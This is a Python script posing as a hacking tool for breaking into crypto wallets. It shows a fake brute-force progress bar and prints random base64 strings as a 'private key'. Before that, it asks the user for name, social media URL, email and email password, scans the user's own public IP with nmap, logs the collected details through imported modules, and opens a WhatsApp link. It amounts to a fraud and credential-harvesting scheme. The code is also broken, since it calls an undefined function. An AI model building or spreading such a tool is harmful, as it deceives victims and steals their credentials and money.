#!/usr/bin/env python3
import os
import time
import base64
import random
import requests
from getpass import getpass
from modules.auth import verify_social_media, verify_email
from modules.logger import encrypt_data, save_log

# --- Config ---
AUTH_KEY = "ETH@admin/payback"
WA_LINK = "https://wa.link/s0uj6k"
TOKENS = [f"{i}.{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}" for i in range(1, 701)]
ENCODED_TOKENS = base64.b64encode("\n".join(TOKENS).encode()).decode()

# --- ASCII Art ---
ANON_ART = r"""
  ____
 /    \
|  ◉ ◉ |   WELCOME TO THE INSIDE
|  ▽  |   Unauthorized access = Immediate termination
 \____/    [ADMIN MONITORING ACTIVE]
"""

SPIDER_ART = r"""
    / _ \
  \_\(_)/_/
   _//"\\_ 
    /   \
"""

def scan_network():
    try:
        import nmap
        nm = nmap.PortScanner()
        ip = requests.get("https://api.ipify.org").text
        nm.scan(hosts=ip, arguments='-F')
        return nm[ip].tcp()
    except:
        return {"Error": "Install nmap: 'sudo apt install nmap'"}

def brute_force():
    for i in range(1800):  # 30 minutes
        time.sleep(1)
        if random.random() < 0.03:
            print(f"[!] Error 0x{i:04X}: Retrying...")
        print(f"\rProgress: [{'#'*(i//60)}{' '*(30-i//60)}] {i/60:.1f}/30min", end="")
    print("\n[+] Wallet compromised. Private key extracted.")

def main():
    print(ANON_ART)
    if input("[?] Accept terms? (yes/no): ").lower() != "yes":
        exit()

    # Auth Steps
    name = input("[?] Full Name: ")
    if getpass("[?] Auth Key: ") != AUTH_KEY:
        exit("[!] Invalid key. Session reported.")
    
    print(SPIDER_ART)
    url = input("[?] Social Media URL: ")
    if not verify_social_media(url):
        exit("[!] Profile invalid. Logged.")
    
    email = input("[?] Email: ")
    if not verify_email(email, getpass("[?] Password: ")):
        exit("[!] Credentials failed. Session terminated.")

    # Network Scan
    print("[*] Scanning network...")
    scan_data = scan_network()
    print(f"[+] Open ports: {scan_data}")

    # Wallet Brute-Force
    if input("[?] Target wallet address: ") and input("[?] Amount: $"):
        fake_brute_force()
        print(f"\n[+] PRIVATE KEY:\n{ENCODED_TOKENS}")
        save_log(name, email, url, scan_data)
        os.system(f"xdg-open {WA_LINK}")

if __name__ == "__main__":
    main()
